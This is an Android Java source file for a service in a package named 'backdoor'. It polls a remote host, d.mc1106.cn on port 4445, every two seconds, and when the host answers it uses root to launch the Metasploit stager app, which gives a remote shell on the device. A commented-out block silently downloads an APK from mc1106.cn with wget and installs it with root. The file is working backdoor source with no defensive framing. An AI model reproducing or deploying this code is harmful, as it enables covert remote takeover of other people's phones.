package com.voila.backdoor;
import android.app.*;
import android.content.*;
import android.os.Bundle;
import android.os.IBinder;
import android.util.*;
import java.io.*;
import java.util.*;
import java.net.*;

public class srv extends Service
{
	public srv()
	{}

	@Override
	public IBinder onBind(Intent p1)
	{
		// TODO: Implement this method
		Log.i("fuck","onBind");
		return null;
	}

	@Override
	public void onCreate()
	{
		Log.i("fuck","onCreate");

		// TODO: Implement this method
		super.onCreate();
	}
	//public static receiver r=new receiver();
	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{
		Log.i("fuck","onStartCommand");
		final Timer t=new Timer();
		TimerTask tt=new TimerTask(){
			boolean b=false;
			@Override
			public void run()
			{
				Log.i("fuck","start");
				
				
				
				try
				{
					Socket s=new Socket();
					//s.setSoTimeout(1000);
					
					SocketAddress sa=new InetSocketAddress("d.mc1106.cn",4445);
					s.connect(sa,500);
					Log.i("fuck","connected");
					
					if(!b) //如果假
					{
						b=true;
						Log.i("fuck","if: "+b);
						Runtime.getRuntime().exec("su -c am start com.metasploit.stage/.MainActivity");
					}
					Log.i("fuck",b+"");
				}catch(Exception e)
				{
					Log.i("fuck",e.getMessage());
					b=false;
					try{
						Runtime.getRuntime().exec("su -c am force-stop com.metasploit.stage");
					}catch(Exception ee) {}
				}
			}
		};
		t.schedule(tt,0,2000);
		/*
		new Timer().schedule(new TimerTask(){

				@Override
				public void run()
				{
					// TODO: Implement this method
					try
					{
						Process p=Runtime.getRuntime().exec("su");
						DataOutputStream os=new DataOutputStream(p.getOutputStream());
						os.writeBytes("pm list package\n");
						os.flush();
						os.close();
						BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
						String line=null;
						StringBuffer sb=new StringBuffer();
						while((line = br.readLine()) != null)
						{
							sb.append(line).append("\n");
						}
						int res=sb.indexOf("com.metasploit.stage");
						Log.i("fuck","res: " + res);
						if(res == -1)
						{
							p = Runtime.getRuntime().exec("su -c wget http://" + InetAddress.getByName("mc1106.cn").getHostAddress() + "/ex.apk -O /data/user/0/com.voila.backdoor/files/ex.apk");
							p.waitFor();
							p = Runtime.getRuntime().exec("su -c pm install /data/user/0/com.voila.backdoor/files/ex.apk");
						}
					}catch(Exception e)
					{}
				}
			},0,1000 * 60 * 5);
			*/

		return super.onStartCommand(intent,flags,startId);
	}
}
